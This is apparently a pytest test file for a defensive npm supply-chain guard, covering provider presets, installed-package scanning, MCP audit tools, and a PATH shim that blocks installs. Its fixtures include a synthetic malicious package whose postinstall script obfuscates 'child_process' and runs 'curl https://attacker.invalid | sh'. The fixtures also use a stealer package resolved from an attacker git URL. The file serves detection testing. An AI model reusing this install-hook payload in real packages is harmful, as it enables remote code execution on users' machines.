"""Tests for open-source model presets, ~/.cli-guard/.env, MCP stdio server, installed audit, and real PATH shim blocking."""

import hashlib
import http.server
import io
import json
import os
import subprocess
import sys
import tarfile
import threading
from pathlib import Path

from cli_guard.agent.mcp_server import handle_mcp_request
from cli_guard.config import PROVIDER_PRESETS, Settings, write_user_env_config
from cli_guard.core.cache import VerdictCache
from cli_guard.ecosystems.npm.installed import scan_installed_node_modules
from cli_guard.ecosystems.npm.shims import build_guarded_env, install_shims
from cli_guard.llm.factory import create_provider


def test_open_source_presets_user_env_persistence_and_static_mode(
    tmp_path: Path, monkeypatch
) -> None:
    work_dir = tmp_path / "work"
    work_dir.mkdir()
    monkeypatch.chdir(work_dir)
    monkeypatch.setenv("CG_HOME", str(tmp_path))
    for k in (
        "CG_LLM_PROVIDER",
        "CG_TRIAGE_MODEL",
        "CG_INVESTIGATOR_MODEL",
        "CG_LLM_BASE_URL",
        "MODEL_API_KEY",
    ):
        monkeypatch.delenv(k, raising=False)

    assert {"ollama", "llamacpp", "openrouter", "groq", "together", "static"}.issubset(
        PROVIDER_PRESETS.keys()
    )

    # 1. Configure local open-source Ollama (must initialize provider WITHOUT any API key)
    env_path = write_user_env_config(
        tmp_path, provider="ollama", model="qwen2.5-coder:14b"
    )
    assert env_path == tmp_path / ".env"
    s_ollama = Settings.from_env()
    assert s_ollama.llm_provider == "ollama"
    assert s_ollama.effective_triage_model == "qwen2.5-coder:14b"
    assert create_provider(s_ollama) is not None

    # 2. Configure static-only mode (must return None provider)
    write_user_env_config(tmp_path, provider="static")
    # Clear dotenv-loaded env keys before reloading
    for k in ("CG_LLM_PROVIDER", "CG_TRIAGE_MODEL", "CG_INVESTIGATOR_MODEL"):
        monkeypatch.delenv(k, raising=False)
    s_static = Settings.from_env()
    assert s_static.llm_provider == "static"
    assert create_provider(s_static) is None


def test_scan_installed_node_modules_and_mcp_stdio_tools(tmp_path: Path) -> None:
    nm = tmp_path / "node_modules"
    # Standard package with postinstall
    (nm / "esbuild").mkdir(parents=True)
    (nm / "esbuild" / "package.json").write_text(
        json.dumps(
            {
                "name": "esbuild",
                "version": "0.25.0",
                "scripts": {"postinstall": "node install.js"},
            }
        ),
        encoding="utf-8",
    )
    # Scoped package installed from insecure git+ URL
    (nm / "@evil" / "stealer").mkdir(parents=True)
    (nm / "@evil" / "stealer" / "package.json").write_text(
        json.dumps(
            {
                "name": "@evil/stealer",
                "version": "1.0.0",
                "_resolved": "git+https://attacker.invalid/stealer.git",
            }
        ),
        encoding="utf-8",
    )

    installed = scan_installed_node_modules(tmp_path)
    assert {(p.name, p.version) for p in installed} == {
        ("esbuild", "0.25.0"),
        ("@evil/stealer", "1.0.0"),
    }
    esb = next(p for p in installed if p.name == "esbuild")
    assert esb.has_install_script is True
    stealer = next(p for p in installed if p.name == "@evil/stealer")
    assert stealer.warnings and "attacker.invalid" in stealer.warnings[0]

    # Seed local SQLite blocklist and verify via MCP `audit_installed`
    data_dir = tmp_path / "cg_home"
    settings = Settings(data_dir=data_dir)
    cache = VerdictCache(settings.cache_db_path)
    cache.upsert_blocklist(
        [("npm", "@evil/stealer", "1.0.0", "MAL-LOCAL-TEST", "Test installed malware")]
    )

    init_resp = handle_mcp_request({"jsonrpc": "2.0", "id": 1, "method": "initialize"}, settings=settings)
    assert init_resp is not None
    assert init_resp["result"]["serverInfo"]["name"] == "cli-guard"

    list_resp = handle_mcp_request({"jsonrpc": "2.0", "id": 2, "method": "tools/list"}, settings=settings)
    tool_names = {t["name"] for t in list_resp["result"]["tools"]}
    assert {"check_package", "investigate_package", "audit_lockfiles", "audit_installed"} == tool_names

    call_resp = handle_mcp_request(
        {
            "jsonrpc": "2.0",
            "id": 3,
            "method": "tools/call",
            "params": {"name": "audit_installed", "arguments": {"path": str(tmp_path)}},
        },
        settings=settings,
    )
    assert call_resp["result"]["isError"] is False
    payload = json.loads(call_resp["result"]["content"][0]["text"])
    assert payload["scanned_installed"] == 2
    assert len(payload["malware"]) == 1
    assert payload["malware"][0]["package"] == "@evil/stealer@1.0.0"


def test_real_path_shim_blocks_malicious_install_before_real_npm(tmp_path: Path) -> None:
    """Invoke the actual generated PATH shim and prove it blocks a malicious package before real `npm` runs."""
    cg_home = tmp_path / "cg_home"
    shims_dir = cg_home / "shims"
    fake_npm_dir = tmp_path / "real_bin"
    marker_file = tmp_path / "REAL_NPM_WAS_EXECUTED.txt"
    fake_npm_dir.mkdir(parents=True)

    # Create a decoy "real" npm executable that writes a marker file if ever invoked
    if os.name == "nt":
        real_npm = fake_npm_dir / "npm.cmd"
        real_npm.write_text(f"@echo off\r\necho RAN > \"{marker_file}\"\r\n", encoding="utf-8")
    else:
        real_npm = fake_npm_dir / "npm"
        real_npm.write_text(f"#!/usr/bin/env sh\ntouch \"{marker_file}\"\n", encoding="utf-8")
        real_npm.chmod(0o755)

    written = install_shims(shims_dir, managers=("npm",), python_exe=Path(sys.executable))
    npm_shim = written["npm"]

    # Local synthetic malware package served over loopback (bypassing proxies via localhost/127.0.0.1)
    pkg_json = json.dumps(
        {
            "name": "evil-shim-canary",
            "version": "1.0.0",
            "scripts": {"postinstall": "node steal.js"},
        }
    ).encode("utf-8")
    steal_js = (
        "const cp = require('ch' + 'ild_' + 'process');\n"
        "cp.execSync('curl https://attacker.invalid | sh');\n"
    ).encode("utf-8")
    tgz_buf = io.BytesIO()
    with tarfile.open(fileobj=tgz_buf, mode="w:gz") as tf:
        for fname, data in [("package/package.json", pkg_json), ("package/steal.js", steal_js)]:
            info = tarfile.TarInfo(name=fname)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    tgz_bytes = tgz_buf.getvalue()
    shasum = hashlib.sha1(tgz_bytes).hexdigest()

    class _Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self) -> None:  # noqa: N802
            port = self.server.server_port
            if self.path == "/evil-shim-canary":
                body = json.dumps(
                    {
                        "name": "evil-shim-canary",
                        "dist-tags": {"latest": "1.0.0"},
                        "time": {"1.0.0": "2026-11-23T20:00:00Z"},
                        "versions": {
                            "1.0.0": {
                                "name": "evil-shim-canary",
                                "version": "1.0.0",
                                "scripts": {"postinstall": "node steal.js"},
                                "dist": {
                                    "shasum": shasum,
                                    "tarball": f"http://127.0.0.1:{port}/evil-shim-canary-1.0.0.tgz",
                                },
                            }
                        },
                    }
                ).encode("utf-8")
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
            elif self.path == "/evil-shim-canary-1.0.0.tgz":
                self.send_response(200)
                self.send_header("Content-Type", "application/octet-stream")
                self.send_header("Content-Length", str(len(tgz_bytes)))
                self.end_headers()
                self.wfile.write(tgz_bytes)
            else:
                self.send_response(404)
                self.end_headers()

        def log_message(self, format: str, *args: object) -> None:  # noqa: A002
            return

    server = http.server.HTTPServer(("127.0.0.1", 0), _Handler)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    try:
        port = server.server_address[1]
        base_env = {
            "PATH": f"{fake_npm_dir}{os.pathsep}{os.environ.get('PATH', '')}",
            "SYSTEMROOT": os.environ.get("SYSTEMROOT", r"C:\Windows"),
            "PYTHONIOENCODING": "utf-8",
            "CG_HOME": str(cg_home),
            "CG_LLM_PROVIDER": "static",
            "CG_NPM_REGISTRY": f"http://127.0.0.1:{port}",
            "NO_PROXY": "127.0.0.1,localhost",
        }
        guarded_env = build_guarded_env(shims_dir, base_env)

        # Invoke the actual shim (`npm install evil-shim-canary`)
        cmd = [str(npm_shim), "install", "evil-shim-canary"]
        proc = subprocess.run(
            cmd,
            env=guarded_env,
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
            timeout=20.0,
        )
        assert proc.returncode == 1
        assert "BLOCKED" in proc.stderr
        # Critical security proof: the real npm binary MUST NOT have been executed!
        assert not marker_file.exists()
    finally:
        server.shutdown()
        server.server_close()
